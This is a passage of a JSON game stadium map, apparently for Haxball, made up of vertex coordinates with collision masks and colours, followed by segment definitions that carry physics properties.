32.202273496916206, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 91 */ { "x" : 75.7663415394249, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 92 */ { "x" : 75.7663415394249, "y" : -26.997263275267812, "cMask" : [ ], "color" : "B6B6B8" }, /* 93 */ { "x" : 46.72362951108576, "y" : -26.997263275267812, "cMask" : [ ], "color" : "B6B6B8" }, /* 94 */ { "x" : 46.72362951108576, "y" : -12.475907261098248, "cMask" : [ ], "color" : "B6B6B8" }, /* 95 */ { "x" : 68.50566353234011, "y" : -12.475907261098248, "cMask" : [ ], "color" : "B6B6B8" }, /* 96 */ { "x" : 83.02701954650968, "y" : -3.037025851888029, "cMask" : [ ], "color" : "B6B6B8" }, /* 97 */ { "x" : -75.25576100793857, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 98 */ { "x" : -75.25576100793857, "y" : 12.210397962990013, "cMask" : [ ], "color" : "B6B6B8" }, /* 99 */ { "x" : -73.80362540652163, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 100 */ { "x" : -73.80362540652163, "y" : 10.758262361573058, "cMask" : [ ], "color" : "B6B6B8" }, /* 101 */ { "x" : -72.35148980510466, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 102 */ { "x" : -72.35148980510466, "y" : 10.032194560864578, "cMask" : [ ], "color" : "B6B6B8" }, /* 103 */ { "x" : -70.89935420368772, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 104 */ { "x" : -70.89935420368772, "y" : 10.032194560864578, "cMask" : [ ], "color" : "B6B6B8" }, /* 105 */ { "x" : -69.44721860227077, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 106 */ { "x" : -69.44721860227077, "y" : 9.3061267601561, "cMask" : [ ], "color" : "B6B6B8" }, /* 107 */ { "x" : -67.99508300085381, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 108 */ { "x" : -67.99508300085381, "y" : 8.580058959447626, "cMask" : [ ], "color" : "B6B6B8" }, /* 109 */ { "x" : -66.54294739943684, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 110 */ { "x" : -66.54294739943684, "y" : 7.853991158739145, "cMask" : [ ], "color" : "B6B6B8" }, /* 111 */ { "x" : -65.0908117980199, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 112 */ { "x" : -65.0908117980199, "y" : 7.853991158739145, "cMask" : [ ], "color" : "B6B6B8" }, /* 113 */ { "x" : -63.63867619660293, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 114 */ { "x" : -63.63867619660293, "y" : 7.127923358030666, "cMask" : [ ], "color" : "B6B6B8" }, /* 115 */ { "x" : -20.800675954802713, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 116 */ { "x" : -20.800675954802713, "y" : -3.763093652596507, "cMask" : [ ], "color" : "B6B6B8" }, /* 117 */ { "x" : -19.348540353385754, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 118 */ { "x" : -19.348540353385754, "y" : -4.489161453304986, "cMask" : [ ], "color" : "B6B6B8" }, /* 119 */ { "x" : -17.8964047519688, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 120 */ { "x" : -17.8964047519688, "y" : -4.489161453304986, "cMask" : [ ], "color" : "B6B6B8" }, /* 121 */ { "x" : -16.444269150551847, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 122 */ { "x" : -16.444269150551847, "y" : -5.578263154367702, "cMask" : [ ], "color" : "B6B6B8" }, /* 123 */ { "x" : -15.718201349843367, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 124 */ { "x" : -15.718201349843367, "y" : -5.578263154367702, "cMask" : [ ], "color" : "B6B6B8" }, /* 125 */ { "x" : -14.26606574842641, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 126 */ { "x" : -14.26606574842641, "y" : -5.941297054721942, "cMask" : [ ], "color" : "B6B6B8" }, /* 127 */ { "x" : -12.813930147009453, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 128 */ { "x" : -12.813930147009453, "y" : -5.941297054721942, "cMask" : [ ], "color" : "B6B6B8" }, /* 129 */ { "x" : -11.361794545592499, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 130 */ { "x" : -11.361794545592499, "y" : -6.30433095507618, "cMask" : [ ], "color" : "B6B6B8" }, /* 131 */ { "x" : -9.909658944175538, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 132 */ { "x" : -9.909658944175538, "y" : -6.30433095507618, "cMask" : [ ], "color" : "B6B6B8" }, /* 133 */ { "x" : -8.457523342758584, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 134 */ { "x" : -8.457523342758584, "y" : -6.66736485543042, "cMask" : [ ], "color" : "B6B6B8" }, /* 135 */ { "x" : 32.92834129762468, "y" : -40.06648368802042, "cMask" : [ ], "color" : "B6B6B8" }, /* 136 */ { "x" : 75.04027373871641, "y" : -40.06648368802042, "cMask" : [ ], "color" : "B6B6B8" }, /* 137 */ { "x" : 32.92834129762468, "y" : -38.614348086603464, "cMask" : [ ], "color" : "B6B6B8" }, /* 138 */ { "x" : 75.04027373871641, "y" : -38.614348086603464, "cMask" : [ ], "color" : "B6B6B8" }, /* 139 */ { "x" : 32.92834129762468, "y" : -37.1622124851865, "cMask" : [ ], "color" : "B6B6B8" }, /* 140 */ { "x" : 75.04027373871641, "y" : -37.1622124851865, "cMask" : [ ], "color" : "B6B6B8" }, /* 141 */ { "x" : 32.92834129762468, "y" : -35.71007688376955, "cMask" : [ ], "color" : "B6B6B8" }, /* 142 */ { "x" : 75.04027373871641, "y" : -35.71007688376955, "cMask" : [ ], "color" : "B6B6B8" }, /* 143 */ { "x" : 32.92834129762468, "y" : -34.2579412823526, "cMask" : [ ], "color" : "B6B6B8" }, /* 144 */ { "x" : 75.04027373871641, "y" : -34.2579412823526, "cMask" : [ ], "color" : "B6B6B8" }, /* 145 */ { "x" : 32.92834129762468, "y" : -32.805805680935634, "cMask" : [ ], "color" : "B6B6B8" }, /* 146 */ { "x" : 75.04027373871641, "y" : -32.805805680935634, "cMask" : [ ], "color" : "B6B6B8" }, /* 147 */ { "x" : 32.92834129762468, "y" : -31.35367007951868, "cMask" : [ ], "color" : "B6B6B8" }, /* 148 */ { "x" : 75.04027373871641, "y" : -31.35367007951868, "cMask" : [ ], "color" : "B6B6B8" }, /* 149 */ { "x" : 32.92834129762468, "y" : -29.901534478101727, "cMask" : [ ], "color" : "B6B6B8" }, /* 150 */ { "x" : 75.04027373871641, "y" : -29.901534478101727, "cMask" : [ ], "color" : "B6B6B8" }, /* 151 */ { "x" : 32.92834129762468, "y" : -28.449398876684764, "cMask" : [ ], "color" : "B6B6B8" }, /* 152 */ { "x" : 75.04027373871641, "y" : -28.449398876684764, "cMask" : [ ], "color" : "B6B6B8" }, /* 153 */ { "x" : 33.654409098333154, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 154 */ { "x" : 33.654409098333154, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 155 */ { "x" : 35.10654469975011, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 156 */ { "x" : 35.10654469975011, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 157 */ { "x" : 36.558680301167065, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 158 */ { "x" : 36.558680301167065, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 159 */ { "x" : 38.01081590258403, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 160 */ { "x" : 38.01081590258403, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 161 */ { "x" : 39.46295150400098, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 162 */ { "x" : 39.46295150400098, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 163 */ { "x" : 40.91508710541794, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 164 */ { "x" : 40.91508710541794, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 165 */ { "x" : 42.367222706834895, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 166 */ { "x" : 42.367222706834895, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 167 */ { "x" : 43.81935830825186, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 168 */ { "x" : 43.81935830825186, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 169 */ { "x" : 45.271493909668806, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 170 */ { "x" : 45.271493909668806, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 171 */ { "x" : -63.63867619660293, "y" : -3.763093652596507, "cMask" : [ ], "curve" : 30.5, "color" : "B6B6B8" }, /* 172 */ { "x" : 68.31204840652863, "y" : -6.231719743439167, "cMask" : [ ], "curve" : 30.5, "color" : "B6B6B8" }, /* 173 */ { "x" : -63.10622352170594, "y" : -1.5848902504710713, "cMask" : [ ], "color" : "B6B6B8" }, /* 174 */ { "x" : 55.24282799377601, "y" : -9.135990946273079, "cMask" : [ ], "color" : "B6B6B8" }, /* 175 */ { "x" : -68.18869812666527, "y" : 1.755026064354094, "cMask" : [ ], "color" : "B6B6B8" }, /* 176 */ { "x" : 45.07787878385732, "y" : -10.588126547690036, "cMask" : [ ], "color" : "B6B6B8" }, /* 177 */ { "x" : -64.5583591231229, "y" : 1.755026064354094, "cMask" : [ ], "color" : "B6B6B8" }, /* 178 */ { "x" : 55.9688957944845, "y" : -9.862058746981559, "cMask" : [ ], "color" : "B6B6B8" }, /* 179 */ { "x" : -63.0993102784863, "y" : 2.252901444237491, "cMask" : [ ], "color" : "B6B6B8" }, /* 180 */ { "x" : 51.61940223345327, "y" : -9.36418336709816, "cMask" : [ ], "color" : "B6B6B8" }, /* 181 */ { "x" : -66.72964928202869, "y" : 4.431104846362928, "cMask" : [ ], "color" : "B6B6B8" }, /* 182 */ { "x" : 64.68862264620587, "y" : -8.638115566389683, "cMask" : [ ], "color" : "B6B6B8" }, /* 183 */ { "x" : -63.0993102784863, "y" : 5.1571726470714045, "cMask" : [ ], "color" : "B6B6B8" }, /* 184 */ { "x" : 47.2629954292024, "y" : -7.912047765681205, "cMask" : [ ], "color" : "B6B6B8" }, /* 185 */ { "x" : -65.27751368061175, "y" : 8.061443849905318, "cMask" : [ ], "color" : "B6B6B8" }, /* 186 */ { "x" : 17.494215600154785, "y" : -9.36418336709816, "cMask" : [ ], "color" : "B6B6B8" }, /* 187 */ { "x" : -63.99134023212772, "y" : 3.207161665771051, "cMask" : [ ], "color" : "B6B6B8" }, /* 188 */ { "x" : -38.57896720733098, "y" : -6.231719743439167, "cMask" : [ ], "color" : "B6B6B8" }, /* 189 */ { "x" : -64.71740803283619, "y" : 3.9332294664795304, "cMask" : [ ], "color" : "B6B6B8" }, /* 190 */ { "x" : 15.150050045096414, "y" : -10.588126547690036, "cMask" : [ ], "color" : "B6B6B8" }, /* 191 */ { "x" : -62.53920463071076, "y" : -1.8753129391882983, "cMask" : [ ], "color" : "B6B6B8" }, /* 192 */ { "x" : -38.57896720733098, "y" : -7.6838553448561235, "cMask" : [ ], "color" : "B6B6B8" }, /* 193 */ { "x" : -62.53920463071076, "y" : 4.659297267188007, "cMask" : [ ], "color" : "B6B6B8" }, /* 194 */ { "x" : -15.344797584659672, "y" : -9.135990946273079, "cMask" : [ ], "color" : "B6B6B8" }, /* 195 */ { "x" : -66.66743009305196, "y" : 0.3028904629371376, "cMask" : [ ], "color" : "B6B6B8" }, /* 196 */ { "x" : -47.06359947392305, "y" : -0.4231773377713408, "cMask" : [ ], "color" : "B6B6B8" }, /* 197 */ { "x" : -62.41472193709564, "y" : -2.1657467068209377, "cMask" : [ ], "color" : "B6B6B8" }, /* 198 */ { "x" : -49.345501524343035, "y" : -1.4396789061124604, "cMask" : [ ], "color" : "B6B6B8" }, /* 199 */ { "x" : -9.909658944175538, "y" : -7.6838553448561235, "cMask" : [ ], "color" : "B6B6B8" }, /* 200 */ { "x" : 22.76339208770598, "y" : -9.135990946273079, "cMask" : [ ], "color" : "B6B6B8" }, /* 201 */ { "x" : -9.183591143467062, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 202 */ { "x" : 8.242036073536417, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 203 */ { "x" : -9.183591143467062, "y" : -39.34041588731194, "cMask" : [ ], "color" : "B6B6B8" }, /* 204 */ { "x" : 11.872375077078807, "y" : -39.34041588731194, "cMask" : [ ], "color" : "B6B6B8" }, /* 205 */ { "x" : -9.183591143467062, "y" : -37.888280285894986, "cMask" : [ ], "color" : "B6B6B8" }, /* 206 */ { "x" : 14.776646279912718, "y" : -37.888280285894986, "cMask" : [ ], "color" : "B6B6B8" }, /* 207 */ { "x" : -9.183591143467062, "y" : -36.43614468447804, "cMask" : [ ], "color" : "B6B6B8" }, /* 208 */ { "x" : 16.22878188132968, "y" : -36.43614468447804, "cMask" : [ ], "color" : "B6B6B8" }, /* 209 */ { "x" : -9.183591143467062, "y" : -34.98400908306107, "cMask" : [ ], "color" : "B6B6B8" }, /* 210 */ { "x" : 16.954849682038155, "y" : -34.98400908306107, "cMask" : [ ], "color" : "B6B6B8" }, /* 211 */ { "x" : -9.183591143467062, "y" : -33.53187348164412, "cMask" : [ ], "color" : "B6B6B8" }, /* 212 */ { "x" : 17.680917482746633, "y" : -33.53187348164412, "cMask" : [ ], "color" : "B6B6B8" }, /* 213 */ { "x" : -9.183591143467062, "y" : -32.07973788022716, "cMask" : [ ], "color" : "B6B6B8" }, /* 214 */ { "x" : 18.40698528345511, "y" : -32.07973788022716, "cMask" : [ ], "color" : "B6B6B8" }, /* 215 */ { "x" : -9.183591143467062, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 216 */ { "x" : 19.133053084163592, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 217 */ { "x" : -9.183591143467062, "y" : -29.17546667739325, "cMask" : [ ], "color" : "B6B6B8" }, /* 218 */ { "x" : 19.859120884872066, "y" : -29.17546667739325, "cMask" : [ ], "color" : "B6B6B8" }, /* 219 */ { "x" : -9.183591143467062, "y" : -27.72333107597629, "cMask" : [ ], "color" : "B6B6B8" }, /* 220 */ { "x" : 20.585188685580544, "y" : -27.72333107597629, "cMask" : [ ], "color" : "B6B6B8" }, /* 221 */ { "x" : 0, "y" : -100, "cMask" : ["red","blue" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180, "cGroup" : ["blueKO" ] }, /* 222 */ { "x" : 0, "y" : 100, "cMask" : ["red","blue" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180, "cGroup" : ["blueKO" ] }, /* 223 */ { "x" : 0, "y" : -100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 224 */ { "x" : 0, "y" : 100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 225 */ { "x" : 0, "y" : -100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 226 */ { "x" : 0, "y" : 100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 227 */ { "x" : 0, "y" : -100, "cMask" : ["red","blue" ], "color" : "B6B6B8", "cGroup" : ["redKO" ], "curve" : 180 }, /* 228 */ { "x" : 0, "y" : 100, "cMask" : ["red","blue" ], "color" : "B6B6B8", "cGroup" : ["redKO" ], "curve" : 180 }, /* 229 */ { "x" : 0, "y" : -100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 230 */ { "x" : 0, "y" : 100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 231 */ { "x" : 0, "y" : -100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 232 */ { "x" : 0, "y" : 100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 } ], "segments" : [ { "v0" : 0, "v1" : 1, "cMask" : [ ], "color" : "FFCCCC" }, { "v0" : 0, "v1" : 2, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 4, "v1" : 3, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 5, "v1" : 1, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 4, "v1" : 2, "bias" : -3, "bCoef" : 0.1, "curve" : 89.99999999999999, "curveF" : 1.0000000000000002, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 5, "v1" : 3, "bias" : -3, "bCoef" : 0.1, "curve" : 89.99999999999999, "curveF" : 1.0000000000000002, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 7, "v1" : 6, "cMask" : [ ], "color" : "CCCCFF" }, { "v0" : 8, "v1" : 6, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 9, "v1" : 10, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 7, "v1" : 11, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 8, "v1" : 10, "bias" : -3, "bCoef" : 0.1, "curve" : 89.99999999999999, "curveF" : 1.0000000000000002, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 9, "v1" : 11, "bias" : -3, "bCoef" : 0.1, "curve" : 89.99999999999999, "curveF" : 1.0000000000000002, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 12, "v1" : 13, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 14, "v1" : 15, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 16, "v1" : 17, "bCoef" : 0.1, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ], "color" : "B6B6B8" }, { "v0" : 16, "v1" : 18, "bCoef" : 0.1, "vis" : false, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ], "color" : "737573" }, { "v0" : 222, "v1" : 221, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["red","blue" ], "cGroup" : ["blueKO" ], "color" : "B6B6B8" }, { "v0" : 224, "v1" : 223, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 226, "v1" : 225, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 21, "v1" : 20, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 20, "v1" : 0, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 1, "v1" : 22, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 23, "v1" : 19, "bCoef" : 0.1, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ], "color" : "B6B6B8" }, { "v0" : 23, "v1" : 24, "bCoef" : 0.1, "vis" : false, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ], "color" : "737573" }, { "v0" : 227, "v1" : 228, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["red","blue" ], "cGroup" : ["redKO" ], "color" : "B6B6B8" }, { "v0" : 229, "v1" : 230, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 231, "v1" : 232, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 22, "v1" : 25, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 6, "v1" : 21, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 25, "v1" : 7, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 26, "v1" : 27, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 28, "v1" : 29, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 30, "v1" : 31, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 32, "v1" : 33, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 34, "v1" : 35, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 36, "v1" : 37, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 38, "v1" : 39, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 40, "v1" : 41, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 42, "v1" : 43, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 44, "v1" : 45, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 46, "v1" : 47, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 48, "v1" : 49, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 50, "v1" : 51, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 52, "v1" : 53, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 54, "v1" : 55, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 56, "v1" : 57, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 58, "v1" : 59, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 59, "v1" : 60, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 60, "v1" : 61, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 61, "v1" : 62, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 62, "v1" : 58, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 63, "v1" : 64, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 64, "v1" : 65, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 65, "v1" : 66, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 67, "v1" : 68, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 68, "v1" : 69, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 69, "v1" : 70, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 70, "v1" : 67, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 69, "v1" : 71, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 71, "v1" : 72, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 73, "v1" : 74, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 74, "v1" : 75, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 75, "v1" : 76, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 90 }, { "v0" : 76, "v1" : 77, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 79, "v1" : 80, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 80, "v1" : 81, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 81, "v1" : 78, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 120 }, { "v0" : 82, "v1" : 83, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 83, "v1" : 84, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 84, "v1" : 85, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 85, "v1" : 86, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 86, "v1" : 87, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 87, "v1" : 88, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 88, "v1" : 82, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 89, "v1" : 90, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 90, "v1" : 91, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 91, "v1" : 92, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 92, "v1" : 93, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 93, "v1" : 94, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 94, "v1" : 95, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 95, "v1" : 85, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 63, "v1" : 96, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 35 }, { "v0" : 66, "v1" : 96, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 40 }, { "v0" : 97, "v1" : 98, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 99, "v1" : 100, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 101, "v1" : 102, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 103, "v1" : 104, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 105, "v1" : 106, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 107, "v1" : 108, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 109, "v1" : 110, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 111, "v1" : 112, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 113, "v1" : 114, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 115, "v1" : 116, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 117, "v1" : 118, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 119, "v1" : 120, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 121, "v1" : 122, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 123, "v1" : 124, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 125, "v1" : 126, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 127, "v1" : 128, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 129, "v1" : 130, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 131, "v1" : 132, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 133, "v1" : 134, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 135, "v1" : 136, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 137, "v1" : 138, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 139, "v1" : 140, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 141, "v1" : 142, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 143, "v1" : 144, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 145, "v1" : 146, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 147, "v1" : 148, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 149, "v1" : 150, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 151, "v1" : 152, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 153, "v1" : 154, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 